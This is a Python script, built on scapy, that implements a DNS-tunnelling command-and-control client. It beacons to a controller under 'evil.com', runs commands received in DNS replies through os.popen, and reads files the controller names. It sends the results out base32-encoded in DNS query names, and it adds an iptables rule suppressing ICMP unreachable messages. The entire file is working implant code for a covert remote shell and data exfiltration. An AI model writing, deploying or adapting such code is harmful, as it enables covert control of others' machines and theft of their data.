from scapy.all import *
import os
import uuid
import random
import base64

SERVER_IP = ""
IFACE = ""
FILTER = "udp and src host " + SERVER_IP
MTU = 30
DOMAIN = "evil.com"

READY_ID = "1"
END_ID = "2"
COMMAND_ID = "3"
APPROVE_ID = "4"
NEXT_ID = "5"
DATA_ID = "6"
STARTING_TO_SEND = "7"
SENDING_DATA = "8"

class Session:
    def __init__(self):
        self.my_seq_num = 0
        self.curr_seq = -1
        
    def IncrementClientSeq(self):
        if self.curr_seq == 9:
            self.curr_seq = 0
        else:
            self.curr_seq += 1

    def IncrementMySeq(self):
        if self.my_seq_num == 9:
            self.my_seq_num = 0
        else:
            self.my_seq_num += 1
    
    def IsValid(self ,recieved_seq):
        if self.curr_seq == 9:
            return 0 == recieved_seq
        return recieved_seq == self.curr_seq + 1
    
    def Reset(self):
        self.my_seq_num = 0
        self.curr_seq = -1
        
def EncodeBase32(data ,is_send_file):
    if not is_send_file:
        data = data.encode('utf-8')
    base32_bytes = base64.b32encode(data)
    base32_bytes = base32_bytes.replace(b'=', b'')
    return base32_bytes if is_send_file else base32_bytes.decode('utf-8')

def DecodeBase32(encoded ,is_send_file):
    if not is_send_file:
        encoded = encoded.encode('utf-8')
    encoded += b'=' * (8 - (len(encoded) % 8)) if len(encoded) % 8 else b''
    message_bytes = base64.b32decode(encoded)
    return message_bytes if is_send_file else message_bytes.decode('utf-8')

def SniffDns(interface ,s_filter ,timer):
    try:
        pkt = sniff(filter = s_filter, timeout = timer, count=1 ,iface = interface)
        return pkt.pop() if pkt else None
    except:
        print("Error: SniffIcmp")


def GetRandomUrl(code):
    rand = uuid.uuid4().hex[0:random.randint(6 , 12)] + ".com"
    return code + rand

def DevideLoad(load):
    return [load[i:i+MTU] for i in range(0, len(load), MTU)]

def RunFile(command):
    try:
        res = os.popen(command).read()
        return res
    except:
        print("Error: RunFile")

def GetFileData(path):
    try:
        with open(path, 'rb') as f:
            return f.read()
    except:
        print("Error: GetFileData")
        
def ParseLoad(load ,commands_and_funcs):
    command = ""
    func = None
    for command_and_func in commands_and_funcs:
        if load.startswith(command_and_func[0]):
            command = load.removeprefix(command_and_func[0])
            func = command_and_func[1]
            break
    return [command ,func]

def Exec(commands_and_func):
    data_requested = commands_and_func[1](commands_and_func[0])
    return data_requested

def BuildPacket(data_to_send ,server_ip):
    return IP(dst = server_ip) / UDP(sport = random.randint(15000,50000) ,dport = 53) / \
                        DNS(id = random.randint(15000,50000) ,rd = 1 ,\
                        qd = DNSQR(qname=data_to_send ,qtype = "A"))


if __name__ == "__main__":
    commands_and_funcs = [["run file" ,RunFile] ,["send file " ,GetFileData] ,["run " ,RunFile]]
    pkt = None
    sniffed = None
    session = Session()
    recieved_seq = 0
    is_send_file = 0
    os.system("iptables -I OUTPUT -p icmp --icmp-type destination-unreachable -j DROP")
    while True:
        ready_pkt = BuildPacket((READY_ID + str(session.my_seq_num) + "." + DOMAIN ) ,SERVER_IP)
        while not (response := sr1(ready_pkt ,timeout = 2)):
            pass
        data = response["DNS"]["DNSRR"].rdata.pop().decode("ascii")
        sniffed_id = data[0]
        recieved_seq = int(data[1])
        data = data[2:]
        session.IncrementMySeq()
        if sniffed_id == COMMAND_ID and session.IsValid(recieved_seq):
            is_send_file = 1 if  "send file" in data else  0
            session.IncrementClientSeq()
            data_requested = Exec(ParseLoad(data ,commands_and_funcs))
            print("Sending..")
            print(data_requested)
            chunks = DevideLoad(data_requested)
            for chunk in chunks:
                encoded_chunk = EncodeBase32(chunk ,is_send_file)
                if is_send_file:
                    encoded_chunk = encoded_chunk.decode('utf-8')
                while True:
                    response = sr1(BuildPacket((SENDING_DATA + str(session.my_seq_num) + \
                                    encoded_chunk + "." + DOMAIN) ,SERVER_IP),timeout = 1)
                    if response and session.IsValid(int(response["DNS"]["DNSRR"].rdata.pop().decode("ascii")[1])):
                        break
                print(chunk)
                session.IncrementClientSeq()
                session.IncrementMySeq()
            while True:
                response = sr1(BuildPacket((END_ID + str(session.my_seq_num) + "." + DOMAIN ) ,SERVER_IP),timeout = 1)
                if response:
                    session.Reset()
                    break
                print("Done sending data")
                